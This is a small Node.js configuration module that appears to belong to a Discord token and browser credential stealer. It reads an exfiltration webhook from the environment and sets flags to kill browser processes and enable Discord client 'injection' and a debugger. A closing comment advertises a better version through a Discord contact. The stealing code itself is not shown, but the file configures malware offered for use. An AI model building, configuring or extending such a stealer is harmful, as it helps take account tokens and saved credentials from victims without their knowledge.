require("dotenv").config();
const process = require("process");

module.exports = function getconfig() {
    return {
        "webhook": process.env.WEBHOOK || "",
        "kill":{ 
            "discords": false,
            "browsers": true,
        }, 
        "debugger": true, 
        "injection": true, 
    }
}
// if you want something better, you can contact me, DIsocrd: k4itrunnnssh